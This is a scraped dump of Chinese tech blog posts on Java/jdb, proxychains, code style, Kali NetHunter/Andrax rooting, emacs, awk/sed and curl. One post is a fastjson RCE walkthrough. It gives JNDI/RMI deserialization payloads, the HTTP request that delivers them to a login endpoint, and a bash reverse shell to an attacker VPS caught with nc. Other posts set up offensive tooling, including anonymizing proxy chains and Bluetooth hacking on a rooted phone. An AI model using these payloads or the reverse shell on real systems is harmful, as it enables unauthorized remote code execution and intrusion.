[abstract|final] class className [extends superclass] [implements interfaceNameList]{\n//\n[public|protected|private] [static] [final]  variableName;\n [public|protected|private] [static] [final|abstract] [native] [synchronized] \u0026lt;dataType\u0026gt; methodName([paramList]) [throws exceptionList]{ }  }\n  \n抽象类  抽象类可以包含普通方法 抽象方法必须在抽象类中  \n重载-Overloading 在一个类中，两个方法名相同，参数列表1 不同 , 与返回类型无关。\n\nstu instanceof Person 是Java中的二元运算符 左边stu是对象，右边Person是类；\n当对象是右边类或子类所创建对象时，返回true；否则，返回false。\n\n反射 \n线程的五个状态 \nJVM调优 调优是针对方法区和堆区进行调优\n双亲委派机制：当某个类加载器加载一个类时，它首先委托它的上级类加载器去夹在，并递归这个操作，\n如果上级的类加载器没有家在，自己才会加载这个类。\n作用： 防止重复加在某个类，保证核心类不被篡改\n\nDebug with jdb \n编译 \u0026amp; 运行 javac -g path/to/src/*.java -d path/to/bin/ # 编译 jar cvfm path/to/xxx.jar manifest.mf path/to/bin/*.class # 打包 # 本地调试 java -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000 \u0026lt;MainClassName\u0026gt; # 运行开启调试 or -jar xx.jar , 顺序： -Xdebug ... -jar .. jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8000 # jdb调试 # 远程调试 java -Xdebug -Xrunjdwp:transport=dt_socket,address=192.168.10.205:8000,suspend=y -jar remoting-debug.jar jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.10.205,port=8000  \njdb命令格式 jdb \u0026lt;options\u0026gt; \u0026lt;className\u0026gt; \u0026lt;arguments\u0026gt;\njava -Xdebug -Xrunjdwp:transport=dt_socket,address=8888,server=n,suspend=y com.lhx.cloud.javathread.MarkWord.JdbMain -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,address=3999,suspend=n -XDebug 启用调试。 -Xnoagent 禁用默认sun.tools.debug调试器。 -Djava.compiler=NONE 禁止 JIT 编译器的加载。 -Xrunjdwp 加载JDWP的JPDA参考执行实例。 transport 用于在调试程序和 VM 使用的进程之间通讯。 dt_socket 套接字传输。 dt_shmem 共享内存传输，仅限于 Windows。 server=y/n =y表示当前是调试服务端，=n表示当前是调试客户端 address=8000 调试服务器的端口号，客户端用来连接服务器的端口号。 suspend=y/n =n表示启动时不中断（如果启动时中断，一般用于调试启动不了的问题） jdb -attach \u0026lt;ip\u0026gt;:8888 #连接到JVM，本机IP即可省略 where options include: -? -h --help -help print this help message and exit -sourcepath \u0026lt;directories separated by \u0026quot;:\u0026quot;\u0026gt; directories in which to look for source files -attach \u0026lt;address\u0026gt; attach to a running VM at the specified address using standard connector -listen \u0026lt;address\u0026gt; wait for a running VM to connect at the specified address using standard connector -listenany wait for a running VM to connect at any available address using standard connector -launch launch VM immediately instead of waiting for 'run' command -listconnectors list the connectors available in this VM -connect \u0026lt;connector-name\u0026gt;:\u0026lt;name1\u0026gt;=\u0026lt;value1\u0026gt;,... connect to target VM using named connector with listed argument values -dbgtrace [flags] print info for debugging jdb -tclient run the application in the HotSpot(TM) Client Compiler -tserver run the application in the HotSpot(TM) Server Compiler options forwarded to debuggee process: -v -verbose[:class|gc|jni] turn on verbose mode -D\u0026lt;name\u0026gt;=\u0026lt;value\u0026gt; set a system property -classpath \u0026lt;directories separated by \u0026quot;:\u0026quot;\u0026gt; list directories in which to look for classes -X\u0026lt;option\u0026gt; non-standard target VM option  \n设置断点 stop \\ clear # 查看断点 stop at \u0026lt;className\u0026gt;:\u0026lt;Line No\u0026gt; # 在特定行号处设置断点 stop in \u0026lt;className\u0026gt;.\u0026lt;method\\field\u0026gt; # 在特定方法\\变量处设置断点  \n查看线程 threads # 查看所有线程 thread \u0026lt;id\u0026gt; # 查看单个线程 where # 查看线程堆栈 pop # 当前帧出栈, 且打印当前帧  \n单步调试 step # 执行当前行(进入函数体) = step into step up # 跳出当前函数,回到当前函数调用处 = step return stepi # 执行当前指令 next # 执行当前行(跳过函数调用) = step over cont # 运行到下一断点处 = resume  \n查看变量 list [line|method] # 查看代码 locals # 查看当前栈所有变量 set \u0026lt;var\u0026gt;=\u0026lt;expr\u0026gt; # 设置变量 eval/print \u0026lt;expr\u0026gt; # 显示java基础类型的值 dump \u0026lt;expr\u0026gt; # 输出java引用类型信息  \n其他 monitor \u0026lt;command\u0026gt;\t# 当程序暂停时自动执行命令 monitor\t# 列出所有的monitor watch \u0026lt;var\u0026gt;\t# 运行到变量的值改变时停止 unwatch \u0026lt;var\u0026gt;\t# 取消watch classes # 列出所有已知的类  Footnotes 1 个数，类型，排列顺序\n","description":"","id":36,"section":"blog","tags":null,"title":"java-basic","uri":"http://crkmythical.github.io/blog/java-basic/"},{"content":"编写进度\n   在github上发现一个自动更新的http代理的仓库fate0\n因此编写了一个python脚本自动获取并添加到proxychains.conf配置文件中\ngetHttp.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63  #!/usr/bin/env python3 # -*- coding: utf-8 -*- # Wed Mar 17 16:39:04 CST 2021 # AUTHOR: Mr.Frame  # Description: # 自动获取http代理，并添加到proxychains.conf中 #Usage: # python3 gethttp.py [/path/to/proxychains.conf] import requests import urllib3 import json def get_socks5(proxychains_path): \u0026#34;\u0026#34;\u0026#34; get socks from http://proxylist.fatezero.org/proxy.list. proxychains_path: str -\u0026gt; the path of proxycahins-ng configuation file. ***suggestion: enable round_robin_chain**** #strict_chain #dynamic_chain #round_robin_chain random_chain chain_len = 2 \u0026#34;\u0026#34;\u0026#34; proxychains_file = proxychains_path url=\u0026#34;http://proxylist.fatezero.org/proxy.list\u0026#34; headers={ \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\u0026#34; } urllib3.disable_warnings() # 关闭ssl警告 try: response = requests.get(url=url,headers=headers,verify=False,timeout=2) except Exception as e: print(\u0026#34;\\033[31m[x]Connection failed\\033[0m\u0026#34;) print(e.__str__()) exit() if response.status_code == 200 : proxy_list = response.text.splitlines() socks_list=\u0026#34;\\n\\n# socks5 list from http://proxylist.fatezero.org/proxy.list\\n\u0026#34; for item in proxy_list: item_dict = json.loads(item) if \u0026#34;http\u0026#34; == item_dict[\u0026#39;type\u0026#39;] and \u0026#34;high_anonymous\u0026#34; == item_dict[\u0026#39;anonymity\u0026#39;]: socks_item = item_dict[\u0026#39;type\u0026#39;] +\u0026#34;\\t\u0026#34; + item_dict[\u0026#39;host\u0026#39;] + \u0026#34;\\t\u0026#34; + str(item_dict[\u0026#39;port\u0026#39;])+\u0026#34;\\n\u0026#34; socks_list += socks_item print(socks_list) # with open(\u0026#34;/usr/local/etc/proxychains.conf\u0026#34;,\u0026#39;a+\u0026#39;) as f: with open(proxychains_file,\u0026#34;a+\u0026#34;) as f: f.write(socks_list) if __name__ == \u0026#39;__main__\u0026#39;: import sys if sys.argv.__len__() == 1: get_socks5(\u0026#34;/usr/local/etc/proxychains.conf\u0026#34;) else: get_socks5(sys.argv[1])   执行脚本后,代理效果不是很好\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  proxychains4 curl cip.cc [proxychains] config file found: /usr/local/etc/proxychains.conf [proxychains] preloading /usr/local/Cellar/proxychains-ng/4.14/lib/libproxychains4.dylib [proxychains] DLL init: proxychains-ng 4.14 [proxychains] Random chain ... 222.78.210.229:57186 ... cip.cc:80 ... OK IP\t: 222.78.210.229 地址\t: 中国 福建 南平 运营商\t: 电信 数据二\t: 福建省南平市 | 电信 数据三\t: 中国福建省南平市 | 电信 URL\t: http://www.cip.cc/222.78.210.229   ","description":"","id":37,"section":"blog","tags":null,"title":"getHttpProxy","uri":"http://crkmythical.github.io/blog/gethttpproxy/"},{"content":"编写进度\n   谷歌代码规范\n编程属于设计行为，负责制造的是编译器或者构建系统\n程序员的能力是用来为用户创造价值的\nHow to code 文学编程(代码即设计文档) 用于表述文档的语言和编程语言结合在了一起\n高质量代码三大特性：可读性 \u0026gt; 简洁性 \u0026gt; 灵活性\n 可读性 第一要务 简洁性 保持代码简洁，不写多余的代码，不写重复的代码 灵活性 添加新代码时，与已有代码不冲突、不排斥\n高质量代码是拥有多种扩展方法、不存在多余要素、可读性高、易于理解的代码。  软件 \u0026ldquo;插件式\u0026quot;软件架构\n 非功能需求\n非功能对开发、运维、计算机资源的高校运用有较大影响，在发布后的运维阶段，比较大的问题多是由性能、系统宕机等非功能需求引起的。  再版-重构  在不改变代码外部行为的前提下，对代码内部结构进行优化，亦称代码体质优化\n 重构的征兆:\n 代码重复、命名不一致 函数体太长 模块规模太大、太多  图书-包 包：一种方便组织代码的机制(实现封装和模块化开发)，类似于文件夹，还可以解决命令冲突问题。\n等模块积攒到一定数量之后再自上而下的将模块按照某种有意义的单位整理并分割\n章节-模块 针对借口编程，而不是针对实现编程\n模块化：让修改模块所带来的影响停留在改模块内部\n模块间互相频繁调用表明折俩函数应放在一个模块\n抽象： 舍弃多余的东西，抽取对象共同的性质组成通用的概念\nParnas原则：\n 对于模块的使用者，仅提供使用该模块锁必需的所有信息，其余信息概不提供 对模块的开发者，仅提供实现该模块所必需的所有信息，其余信息概不提供  关注点分离： 将各个与关注点有关的代码集中起来做成独立的模块，与其他代码分离。如MVC模型，AOP(面向切面编程)\nOCP开闭原则: 对扩展开发、对修改关闭 面向对象的多态性是实现OCP的代表技术\n 内聚度: 单个模块内的功能的纯粹程度 耦合度: 衡量模块间关系紧密程度 模块间仅通过参数传递标量类型的数据作为模块间的接口  模块应以实现高内聚、低耦合的模块为目标\n序言-注释 注释的目的是帮值阅读代码的人了解作者写代码时的思想\n代码只能表达“What”、“How” 、注释表达“Why”\n注释内容要简洁明了，防止注释二义性\n模块注释 1 2 3 4 5 6 7 8 9  # File Name: xxx # Author: Mr.Frame # Version: 0.1 # Date:  # Description:  # # # Function List:   函数注释 1 2 3 4 5 6 7 8 9  # Function:  # Description:  # # Input:  # Output: # Return:  # Call:  # Called by:  # Others:   代码注释 注释应放在代码上方/或/右方\n目录-函数 将代码分割成级别统一的函数，函数一览起到目录的作用\n复合函数： 将函数结构化，各函数的处理将以调用比自己低一个级别的函数为中心\n不要在复合函数中调用不同抽象级别的函数，\n一个函数中不能既有连接数据库(低级处理)、又有执行业务逻辑(高级处理)\n将关系紧密的代码集中在一起函数化，同时保证关联性较弱的代码互不依赖\n通用过滤器：接收某种数据流后，经过加工输出文本格式的数据流\n函数行数不过百，仅输出重要信息\n防御性编程:\n 确认外部代码传来的数据输入值(有效范围、字符串长度) 确认参数的值(检测无效输入)  段落-代码块 正交性: 代码之间应具有独立性和分离性(例如：访问数据库代码和用户接口代码)\n代码块内列对齐\n不同的代码块之间有空行\n 数据常量化\n对代码的逻辑进行函数化、模块化\n 比较操作时，把改变的值放在左边，把稳定的值放在右边\n将逻辑和该逻辑处理的数据放在相近的位置\n处理流程尽量走直线,不使用条件分支\n每个控制条件都存在与之成对的反条件，\n保证控制条件具有统一性：\n即便某个if语句一定成立，也要考虑else语句的情况\n即便某个case语句一定成立，也要考虑default语句的情况\n即使某个变量不可能为空，也要检查该变量是否为NULL\n正文-代码 命名：名字是面向代码阅读者的用户界面。名字说明的是效果和目的，不是手段，\n  使用专业具体含义的词\n  全局变量名较长，局部变量名较短\n  恰当使用大小写和下划线\n  减少变量作用域\n 表示范围: max/min 、first/last 、begin/end 表示bool: is/has    注释/索引-Editor自带 图书中有注释和索引，但IDE和编辑器的跳转和搜索功能可以满足这部分需求。\n 「编程的原则：改善代码质量的101个方法」  How to read 代码阅读是一项机会主义、以目标为导向的思维活动。\n在大多数情况下，我们无法承担阅读和理解整个软件系统代码的代价，\n任何试图对代码进行精确分析的想法，都会导致陷入大量的类、文件和模块中。\n因此，我们必须积极低减少必须理解的代码\n 学习编写伟大代码的方式: 阅读大量优质代码\n阅读优秀源码基础: 设计模式 算法、数据结构  在熟悉基本的编程和计算机科学概念后，通过阅读一套设计良好的软件系统的内部细节\n可以学到新颖的架构模式、数据结构、编码方法、算法、风格和文档规范、API、甚至一门新的计算机语言。\n 良好习惯: 有目标地阅读辨认编写的高质量代码(遇到库元素就阅读库文档)  Steps  阅读README，安装依赖，编译运行,编译不成功不读 主框架,阅读main函数，梳理主逻辑  a. 函数调用顺序、及其参数 b.    ","description":"","id":38,"section":"blog","tags":[""],"title":"code_of_principle","uri":"http://crkmythical.github.io/blog/code-of-principle/"},{"content":"编写进度\n   Kali Nethunter 准备工作  安装android-plateform-tools brew install android-platform-tools 三个zip包  [TWRP for 10](https://dl.twrp.me/guacamole/） Magisk Disable-Dm-Verity_ForceEncrypt\n可选   谷歌框架  刷入  设置-\u0026gt;系统-\u0026gt;开发者模式界面，开启OEM解锁、USB调试两个个选项 手机链接电脑运行如下命令  1 2 3 4 5 6 7 8 9 10  adb reboot bootloader # 进入fastboot模式 fastboot oem unlock # 解锁，手机出现解锁界面，用音量键选择UNLOCK THE BOOTLOADER，电源键确认 fastboot boot twrp-3.x.x.x.img # 刷入twrp镜像,等待几秒进入临时twrp模式 adb push twrp-3.x.x.zip /sdcard # 上传twrp的zip包，并刷入twrp镜像, adb reboot recovery # 重启到recovery模式 adb push Magisk-vx.zip # 上传Magisk包并刷入 adb push Disable_Dm-Verify-ForceEncrypt_xx.zip /sdcard # 解锁Data分区，上传Disable_Dm-Verity-ForceEncrypt并刷入 adb reboot # 重启，进行初始化设置 adb push nethunter-2021.1-oneplus7-oos-ten-kalifs-full.zip # 上传kali nethunter镜像并刷入 adb reboot # 重启   关闭系统更新提示 1 2 3  adb shell pm disable-user com.oneplus.opbackup # 屏蔽更新 adb shell pm clear com.oneplus.opbackup # 清除通知 adb shell enable com.oneplus.opbackup # 恢复更新   升级系统保留ROOT权限操作 一加7T如何保留ROOT OTA升级系统\n一加7 OTA升级保留ROOT\nAndrax Andrax文档\nAndrax仓库\n下载Andrax-mobile.zip\n手机连接电脑输入\n1 2 3 4 5 6  unzip ANDRAX-Mobile.zip adb push andraxcorev6001.tar.xz.cpt /sdcard/Download adb install ANDRAXMobile6001.apk adb shell pm list packages # 查看所有包 adb shell dumpsys activity com.thecrackertechnology.andrax # 获取指定包的Activity adb shell am start -n com.thecrackertechnology.andrax/com.thecrackertechnology.dragonterminal.ui.term.NeoTermActivity # 点击”OK“   root和andrax默认密码andrax\nSSH 1 2  sudo service --status-all sudo service ssh start   VNC 1 2  sudo service vnc start vnc-viewer 192.168.43.73:5901   Bluetooth Hacking  open Andrax Terminal with Recovery shell  1 2  su cd /;cat *.rc | grep -i \u0026#34;bluetooth\u0026#34; | grep -i \u0026#34;net_bt_stack\u0026#34; | grep -i \u0026#34;\\/dev\u0026#34; # 定位串口   输出\nchown bluetooth net_bt_stack /dev/ttyS0\nopen Andrax Terminal  1 2 3  sudo stty -F /dev/ttyS0 # 查看串口速率 sudo hciattach -s 115200 /dev/ttyS0 any 3000000 # 创建接口 sudo hciconfig hci0 up # 激活接口   参考\n一加7基于安卓10版本安装NetHunter\n一加7Pro把玩Nethunter\n就砖\nTWRP备份与还原操作\nTWRP备份与还原操作2\nAndrax和nethunter介绍\n","description":"","id":39,"section":"blog","tags":null,"title":"kali_nethunter and Andrax","uri":"http://crkmythical.github.io/blog/kali-nethunter_and_andrax/"},{"content":"编写进度\n   漏洞url http://x.x.x.x/demo/login\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  POST /demo/login HTTP/1.1 Host: x.x.x.x Content-Length: 35 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Content-Type: application/json Origin: http://106.14.21.5:31180 Referer: http://106.14.21.5:31180/demo/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510 Connection: close {\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;}   利用 在vps(47.106.65.x)上生成payload fastjson_tool.jar\n1 2 3 4 5 6  java -cp /tmp/fastjson_tool.jar fastjson.HRMIServer 47.106.65.x 1099 \u0026#34;bash=bash -i \u0026gt;\u0026amp; /dev/tcp/47.106.65.x/9999 0\u0026gt;\u0026amp;1\u0026#34; [-] payload: {\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://47.106.65.x:1099/Object\u0026#34;,\u0026#34;autoCommit\u0026#34;:true} [-] payload: {\u0026#34;e\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;},\u0026#34;f\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://47.106.65.x:1099/Object\u0026#34;,\u0026#34;autoCommit\u0026#34;:true}} [-] Opening JRMP listener on 1099 ...   在vps上监听999端口 1  nc -lvvp 999   发送payload 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  POST /demo/login HTTP/1.1 Host: x.x.x.x Content-Length: 184 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Content-Type: application/json Origin: http://x.x.x.x Referer: http://x.x.x.x/demo/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: td_cookie=3992386100; JSESSIONID=4fade538-068e-4ee7-90b3-fb0742047510 Connection: close {\u0026#34;e\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;},\u0026#34;f\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;rmi://47.106.65.x:1099/Object\u0026#34;,\u0026#34;autoCommit\u0026#34;:true}}   ","description":"","id":40,"section":"blog","tags":null,"title":"fastjson_rce","uri":"http://crkmythical.github.io/blog/fastjson-rce/"},{"content":"编写进度\n   EMACS(Editor MACroS)\n在 Emacs 中, 我们有一条规定:\n   key binding Description     C-\u0026lt;字符\u0026gt; 在输入 \u0026lt;字符\u0026gt; 时按住 Control   M-\u0026lt;字符\u0026gt; 在输入 \u0026lt;字符\u0026gt; 时按住 Alt   s-\u0026lt;字符\u0026gt; 在输入 \u0026lt;字符\u0026gt; 时按住 Super    Emacs帮助信息    key binding Description     C-h t 帮助-教程tutorial   C-h k 帮助-快捷键   C-h f 帮助-函数介绍functions   C-h v 帮助-变量介绍varialbes    窗口操作    key binding Description     C-x 0 关闭当前窗口   C-x 1 只保留当前窗口   C-x 2 水平分割窗口   C-x 3 垂直分割窗口   C-x o 切换窗口    缓冲区buffer操作    key binding Description     C-x C-b 打开buffer列表   C-x b 切换buffer   C-x \u0026lt;L/R\u0026gt; 切换buffer   C-x k 关闭buffer    文件操作 打开文件    key binding Description     C-x d 打开目录   C-x C-f 查找/创建文件    搜索    key binding Description     C-s 向下搜索   C-r 向上搜索    编辑文件/buffer 移动 C-u \u0026lt;num\u0026gt; \u0026lt;key\u0026gt; 执行\u0026lt;num\u0026gt;次\u0026lt;key\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  |M-\u0026lt;(开头)\t: C-l |\t: 居顶 |\tM-v(翻屏) |C-a(行首) :\tC-e(行尾) |M-a(句首)\t: M-e(句尾) |\t: |\tC-p(上行) |\t: C-l |\t(左移字符/单词)C-b/M-b ...|_(光标) .... C-f/M-f(右移字符/单词） 居中| : |\tC-n(下行) |\t: |\t: |\t: |\t: |\tC-v(翻屏) | : C-l |\t: 居底| :\tM-\u0026gt;(结尾)   删除 1 2 3 4 5  | : |M-k(删除光标至行首)\t...|_(光标)... C-k(光标至行尾、重复则删除换行符) | : | (删除字符)\u0026lt;DEL\u0026gt;/(移除单词)M-\u0026lt;DEL\u0026gt; .... |_(光标) .... C-d(删除字符/M-d(移除单词） | :   选择    key binding Description     C-@ 开启标记    复制/剪贴    key binding Description     M-w 复制   C-w 剪贴    粘贴    key binding Description     C-y 粘贴    撤销/重做    key binding Description     C-x u 仅撤销   C-/ 撤销/重做   C-_ 撤销/重做    保存    key binding Description     C-x C-s 保存当前buffer到对应文件   C-x s 保存所有buffer到对应文件    ","description":"","id":41,"section":"blog","tags":null,"title":"emacs","uri":"http://crkmythical.github.io/blog/emacs/"},{"content":"编写进度\n    记住三个命令的运用形式\ngrep \u0026lsquo;字符\u0026rsquo; 文件 擅长查找文件内容\nsed \u0026lsquo;命令\u0026rsquo; 文件 擅长取行和替换\nawk \u0026lsquo;条件{命令}\u0026rsquo; 文件 擅长取列,统计\n  单引号内就是正则表达式的用法\n  awk 处理过程：\n 将文件中的第一行作为输入，然后将此行放入模式空间，并将此行(以换行符结束)赋给内部变量$0 字段分解(默认IFS为空格,可通过-F来修改)，切割整行内容，并将切割后的字段依次赋给$1,$2..$n ,NF=n, NR+=1（NR=0） 检查print函数需要打印的字段，从模式空间中取出字段对应的值，输出结果到屏幕以空格为分割(可通过内部变量OFS进行调整) 继续将第二行载入模式空间，并将其值存储在$0中，覆盖原来的内容 重复1-4  1 2 3 4 5 6  awk [options] \u0026#39;commands\u0026#39; filename awk [options] -f awk-script-file filename \u0026lt;commands\u0026gt;部分： 预处理 行处理 处理后 BEGIN{ } {} END{}   常见用法： 匹配+处理\n1  awk -F \u0026#34;[ :\\t]+\u0026#34; \u0026#39;BEGIN{ OFS=\u0026#34;--\u0026#34; } /\u0026lt;pattern\u0026gt;/{ if (\u0026lt;condition\u0026gt;) {\u0026lt;if_true_statment\u0026gt;} else{\u0026lt;if_false_statment\u0026gt;} } END{}\u0026#39; /path/to/file    -F \u0026quot;[ :\\t]+\u0026quot; 指定多个IFS,可以多个冒号和空格和tab键 NF 每行最后一列的$，将复制给NF, $NF 打印最后一列的值 , FNR用于多文件处理 NR 记录行号,从1开始 OFS 逗号,映射为OFS，初始情况下OFS变量是空格  awk分支语句结构 1  awk \u0026#39;/\u0026lt;pattern\u0026gt;/ { if( \u0026lt;condition\u0026gt; ) { if_true_statement } else if ( \u0026lt;condition\u0026gt; ) { elif_true_statement } else { elif_false_statement } }\u0026#39; /path/to/file   awk循环语句结构  while  1  awk -F : \u0026#39;{ i=1; while ( \u0026lt;condition\u0026gt; ) { while_true_statmen } }\u0026#39; /path/to/file    for  1  awk -F : \u0026#39; { for ( : : ) {for_true_statement} } \u0026#39; /path/to/file   打印指定行之间的文本 类似于cat -n\n1 2  awk \u0026#39;NR==M,NR==N {printf $1}\u0026#39; filename cat file | awk \u0026#39;NR==M,NR==N\u0026#39; #打印M行到N行之间的文本   打印模式之间行的文本 1  awk \u0026#39;/start_pattern/,/end_pattern/\u0026#39; filename   匹配指定列的内容 1 2  awk -F : \u0026#39;$3 ~ /alice/\u0026#39; /etc/passwd awk -F : \u0026#39;$3 !~ /alice/\u0026#39; /etc/passwd   sed sed命令若无语法错误，返回值永远是0\n1 2  sed [option] \u0026#39;\u0026lt;command\u0026gt;\u0026#39; /path/to/files sed [option] \u0026#39;s/\u0026lt;str_old\u0026gt;/\u0026lt;str_new\u0026gt;/\u0026lt;g/i\u0026gt;\u0026#39; /path/to/file     Options\n -e 允许多个'' -n 只输出匹配的行 -i 直接修改文件 -r 支持扩展元字符    参数 \u0026lsquo;//{\u0026lt;a;i;c;d\u0026gt;} [String]\u0026rsquo;\n a 追加后面 在当前行后添加一行/多行 i 追加前面 在当前行之前插入文本 c 行替换 在当前行进行替换/修改 d 删除 在当前行进行删除操作 sg 全局替换 p 打印匹配/指定的行    匹配ip地址 1 2 3 4 5  ifconfig eth0 | sed -rn \u0026#39;2s#(^.*inet) (.*) (net.*$)#\\2#gp\u0026#39; ifconfig eth0 | sed -rn \u0026#39;2s/(^.*inet) (.*) ( net.*$)/\\2/gp\u0026#39; ifconfig en0 | sed -rn \u0026#39;5s/(.*inet )(.*)( net.*)/\\2/gp\u0026#39; # mac本地ip ifconfig utun2 | sed -rn \u0026#39;2s/(^.*inet )(.*)( --\u0026gt;.*$)/\\2/gp\u0026#39;   grep/egrep 匹配ip地址 1  ifconfig eth0 | grep netmask | egrep \u0026#34;([0-9]|\\.){1,4}\u0026#34;   ","description":"","id":42,"section":"blog","tags":null,"title":"awk-sed-grep-find","uri":"http://crkmythical.github.io/blog/awk-sed-grep-find/"},{"content":"编写进度\n   curl curl是一个精简的命令行浏览器,调试API,类似于postman、Apifox\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  curl [-X GET/POST/HEAD/PUT] \\# 请求方法设置 [-G ] # 请求头设置 [-H \u0026#39;xx: xx\u0026#39;] \\# 设置请求头信息 [-A \u0026#39;Mozilla/5.0***\u0026#39;] \\# 指定User-Agent [-b \u0026#39;foo=bar\u0026#39;] \\# 指定cookie [-c cookies.txt] \\# 指定cookie [-e \u0026#39;https://xxx\u0026#39;] \\# 设定Referer [-D respHeader.txt] \\# 将服务器响应头信息保存到respHeader.txt 即cookie [-r 0-100 ] \\# 设定Range: bytes=start-end 请求资源的部分内容 # 数据设置 [-d \u0026#39;xx\u0026#39;] \\# POST请求数据(自动设置Content-Type: application/x-www-form-urlencoded) [-d @local_file] \\# POST请求数据 [--data-urlencode \u0026#39;xx\u0026#39;] \\# 等同于-d,但会对数据进行url编码 [-F \u0026#39;file=@photo.png;filename=me.png;type=application/octet-stream\u0026#39;] \\# 上传二进制文件photo.png(自动设置Content-Type: multipart/form-data, MIME:application/octet-stream 服务器收到的文件名为me.png) # 认证信息 [-u \u0026#39;bob:12345\u0026#39;] \\# 用户密码(自动设置Authorization: Basic Ym9iOjEyMzQ1) # 代理设置 [--no-proxy proxyserver] \\# 跳过passwd@proxyserver代理 [-x user:passwd@proxyserver:port] \\# 默认HTTP代理 [-x socks4://user:passwd@proxyserver:port] \\# socks4代理 [-x socks5://user:passwd@proxyserver:port] \\# socks5代理 # 其他设置 [-s] \\# slient模式 [--interface eth1 ] \\# 指定网卡 [--local-port] \\# 指定源端口 [-S] \\# 仅输出错误信息 [-k] \\# 跳过SSL检测 [-v] \\# 显示请求过程 [-#] \\# 显示进度条 [-I] \\# 显示请求头 =[-X HEAD] [-i] \\# 显示响应头 [-C -] \\# 断点续传 [-L] \\# 自动重定向 [-o example.html] \\# 保存html页面 [-O ] \\# 保存与服务器url中同名的文件名   常用格式 1  curl -X \u0026lt;VERB\u0026gt; \u0026#39;\u0026lt;PROTOCOL\u0026gt;://\u0026lt;HOST\u0026gt;:\u0026lt;PORT\u0026gt;/\u0026lt;PATH\u0026gt;?\u0026lt;QUERY_STRING\u0026gt;\u0026#39; -d \u0026#39;\u0026lt;BODY\u0026gt;\u0026#39;      参数 描述     VERB 适当的 HTTP 方法 或 谓词 : GET、 POST、 PUT、 HEAD 或者 DELETE。   PROTOCOL http 或者 https（如果你在 Elasticsearch 前面有一个 https 代理）   HOST Elasticsearch 集群中任意节点的主机名，或者用 localhost 代表本地机器上的节点。   PORT 运行 Elasticsearch HTTP 服务的端口号，默认是 9200 。   PATH API 的终端路径（例如 _count 将返回集群中文档数量）。Path 可能包含多个组件，例如：_cluster/stats 和 _nodes/stats/jvm 。   QUERY_STRING 任意可选的查询字符串参数 (例如 ?pretty 将格式化地输出 JSON 返回值，使其更容易阅读)   BODY 一个 JSON 格式的请求体 (如果请求需要的话)    curl上传文件 1 2 3 4 5  \u0026lt;form action=\u0026#34;submit.cgi\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; Name: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;person\u0026#34;\u0026gt;\u0026lt;br\u0026gt; File: \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;secret\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt;   1  curl -F person=anonymous -F secret=@file.txt http://example.com/submit.cgi   发送JSON格式的请求 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  curl -XGET \u0026#39;http://localhost:9200/_count?pretty\u0026#39; -d \u0026#39; { \u0026#34;query\u0026#34;: { \u0026#34;match_all\u0026#34;: {} } } \u0026#39; { \u0026#34;count\u0026#34; : 0, \u0026#34;_shards\u0026#34; : { \u0026#34;total\u0026#34; : 5, \u0026#34;successful\u0026#34; : 5, \u0026#34;failed\u0026#34; : 0 } }   wget wget是一个下载工具\n1 2 3 4 5 6 7 8 9 10  wget [-t 5] \\ #网络不稳定导致的终端，重试下载次数,0表示不断重试 [-O output_name] \\ # 指定输出文件名 [--limit-rate 20k] \\# 限速 20k [-c] \\ # 断点续传 [--mirror --convert-links] \\# 复制整个网站 [-r] \\# 递归下载 [--user username --password pass] \\# 提供身份验证 [--user-agent=\u0026#34;Mozilla/5.0\u0026#34;] \\ #指定user-agent [-P /tmp] \\ 